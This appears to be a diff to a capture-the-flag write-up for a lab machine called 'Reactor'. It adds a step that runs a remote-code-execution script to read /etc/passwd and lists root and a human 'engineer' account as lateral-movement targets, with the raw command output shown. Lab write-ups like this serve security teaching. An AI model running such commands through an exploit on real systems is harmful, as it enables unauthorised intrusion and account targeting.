@@ -979,6 +979,22 @@ With execution context confirmed, further enumeration commands were run to map t
 Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+**Command:** `python3 rce.py "cat /etc/passwd"`
+
+**Breakdown:**
+
+- `cat /etc/passwd`
+    - **Description:** Reads the system user account file
+    - **Purpose:** Reveals all local user accounts, their home directories, and shells — identifies human accounts worth targeting for lateral movement.
+
+**Result:** Full passwd file returned. Two accounts of immediate interest were identified:
+
+| Username   | UID  | Home             | Shell               | Significance                                           |
+| ---------- | ---- | ---------------- | ------------------- | ------------------------------------------------------ |
+| `root`     | 0    | `/root`          | `/bin/bash`         | Ultimate privilege target                              |
+| `engineer` | 1000 | `/home/engineer` | `/bin/bash`         | Human account — interactive login shell, SSH candidate |
+| `node`     | 999  | `/home/node`     | `/usr/sbin/nologin` | Current execution context — no interactive shell       |
+
 ```
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 rce.py "cat /etc/passwd"
@@ -1017,7 +1033,11 @@ sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
 engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
 node:x:999:988::/home/node:/usr/sbin/nologin
 _laurel:x:996:987::/var/log/laurel:/bin/false
+```
 
+
+
+```
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 rce.py "pwd"                 
 /opt/reactor-app
